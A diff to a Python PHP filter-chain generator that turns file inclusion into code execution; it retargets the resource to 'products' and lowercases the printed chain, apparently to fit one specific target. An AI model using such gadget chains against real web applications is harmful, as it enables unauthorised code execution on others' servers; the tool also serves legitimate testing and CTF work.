@@ -9,7 +9,7 @@ import re
 # https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d
 
 # No need to guess a valid filename anymore
-file_to_use = "php://temp"
+file_to_use = "products"
 
 conversions = {
     '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
@@ -116,7 +116,7 @@ def main():
         base64_value = base64.b64encode(chain).decode('utf-8').replace("=", "")
         chain = generate_filter_chain(base64_value)
         print("[+] The following gadget chain will generate the following code : {} (base64 value: {})".format(args.chain, base64_value))
-        print(chain)
+        print(chain.lower())
     if args.rawbase64 is not None:
         rawbase64 = args.rawbase64.replace("=", "")
         match = re.search("^([A-Za-z0-9+/])*$", rawbase64)
